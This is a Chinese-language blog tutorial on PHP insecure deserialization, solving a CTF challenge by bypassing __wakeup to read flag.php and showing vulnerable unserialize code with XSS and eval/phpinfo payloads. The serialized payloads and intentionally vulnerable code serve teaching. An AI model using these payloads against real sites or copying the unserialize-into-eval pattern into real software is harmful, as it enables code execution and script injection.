@@ -1,0 +1,105 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<h1><a id="_0"></a>渗透学习</h1>
+<p>不安全的反序列化之PHP反序列化</p>
+<hr/>
+<p></p>
+<div class="toc">
+<h3>文章目录</h3>
+<ul><li><a href="#_0">渗透学习</a></li><li><a href="#_10">前言</a></li><li><ul><li><a href="#_16">*本文只做学习用途，严禁利用本文提到的技术进行非法攻击，否则后果自负，本人不承担任何责任。*</a></li></ul>
+</li><li><a href="#CTF_19">一、CTF例题</a></li><li><a href="#PHPXSS_58">二、PHP反序列化漏洞和XSS跨站脚本</a></li><li><a href="#_129">总结</a></li></ul>
+</div>
+<p></p>
+<hr/>
+<h1><a id="_10"></a>前言</h1>
+<p>本系列用于记录本人渗透学习的过程，主要内容围绕Owasp TOP 10展开。</p>
+<p>接上篇<a href="https://blog.csdn.net/bwxzdjn/article/details/123657270?spm=1001.2014.3001.5501">不安全的反序列化之反序列化基础</a>用简单案例接触了PHP反序列化，但对该漏洞的利用和实际场景浅尝辄止 。这篇将会用代码审计的方式分析一道典型的存在PHP反序列化漏洞的案例，加深对魔术方法等相关知识的理解。另外，还会和xss跨站脚本的知识进行融合。</p>
+<h2><a id="_16"></a><em>本文只做学习用途，严禁利用本文提到的技术进行非法攻击，否则后果自负，本人不承担任何责任。</em></h2>
+<h1><a id="CTF_19"></a>一、CTF例题</h1>
+<p><a href="https://www.freebuf.com/news/172507.html">学习案例</a></p>
+<pre><code class="prism language-php"><span class="token keyword">class</span> SoFun<span class="token punctuation">{<!-- --></span> 
+    <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> 
+      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span> file<span class="token punctuation">,</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span>  <span class="token function">strchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span>
+          <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">dirname </span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">else</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Wrong filename.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span><span class="token punctuation">}</span>  
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> <span class="token variable">$this</span><span class="token operator">-&gt;</span> file<span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">return</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>     
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
+    <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span> 
+       <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+       <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
+<span class="token operator">?</span><span class="token operator">&gt;</span>   <span class="token comment">#&lt;!--key in flag.php--&gt;</span>
+</code></pre>
+<p><strong>代码审计：</strong><br/> 根据提示，key在flag.php中，而想要获得文件中内容，只能靠语句<code>show_source(dirname (__FILE__).'/'.$this -&gt;file);</code>。<br/> 发现该题用到了__destruct等魔术方法，可以根据其性质进行漏洞利用（详见上一篇文章）<br/> 常规思路是利用反序列化的方式POST"file"参数将读取的文件从index.php替换成flag.php，然后利用__destruct的自动执行读取flag.php中的内容。<br/> 但是在反序列化执行时会自动执行__wakeup，其作用是将文件再设为index.php<br/> <strong>解决方案：</strong><br/> 显然我们需要利用一种方法绕过__wakeup方法，而当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。比如：<br/> 实际情况：O:7:”Student”:1:{S:4:”name”;s:8:”zhangsan”;}<br/> Payload：O:7:”Student”:2:{S:4:”name”;s:8:”zhangsan”;}<br/> Payload对象属性个数为2，而实际属性个数为1，那么就会掉入漏洞，从而跳过wakeup()方法。<br/> <strong>Payload</strong><br/> 根据上篇文章所学，易得反序列化语句为O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}<br/> 值得注意的是，file是protected属性，因此需要用\00*\00来表示，\00代表ascii为0的值。<br/> 此题还需要一次Base64编码，结果为：<br/> Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/136a484a5a304343a7be0f8f6e43f4fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnd4emRqbg==,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 该PHP反序列化漏洞的案例其实来源于16年SugarCRM v6.5.23中<br/> SugarCRM（http://www.sugarcrm.com/ ）是一套开源的客户关系管理系统。研究者发现在其&lt;=6.5.23的版本中存在反序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权状态下执行任意代码。<br/> 有兴趣的可以<a href="https://paper.seebug.org/39/">点击</a>了解</p>
+<h1><a id="PHPXSS_58"></a>二、PHP反序列化漏洞和XSS跨站脚本</h1>
+<p>当尝试序列化一段xss代码的时候，当它进行反序列化的时候会自动执行xss</p>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span> <span class="token comment">//字符串</span>
+    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'jack'</span> <span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'rose'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//数组</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string double-quoted-string">"&lt;img src=1 οnerrοr=alert(1)&gt;"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"序列化:"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token variable">$aa</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token variable">$arr_a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token variable">$class1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//对象</span>
+    <span class="token variable">$class_a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$class1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$class_a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"反序列化:"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$arr_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$class_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>执行结果：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/79ac4e651a144a328f848da77a068bed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnd4emRqbg==,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 在__wakeup中一样存在类似的漏洞：</p>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>使用payload：<code>O:1:"A":1:{s:4:"test";s:28:"&lt;img src=1 onerror=alert(1)&gt;";}</code>一样会造成XSS攻击</p>
+<p>而如果__wakeup中不是echo $this-&gt;test; ,是eval(*)那么就是任意代码执行则会造成更严重的后果。<br/> 比如：</p>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+           <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>构造payload：<code>O:1:"A":1:{s:4:"test";s:10:"phpinfo();";}</code>即可获得php内置信息</p>
+<hr/>
+<h1><a id="_129"></a>总结</h1>
+<p>以上介绍了一道比较综合的CTF题目对PHP反序列化漏洞有一个更清晰化的认识，这道题难度不算高，但对代码审计能力有着一定的要求。</p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
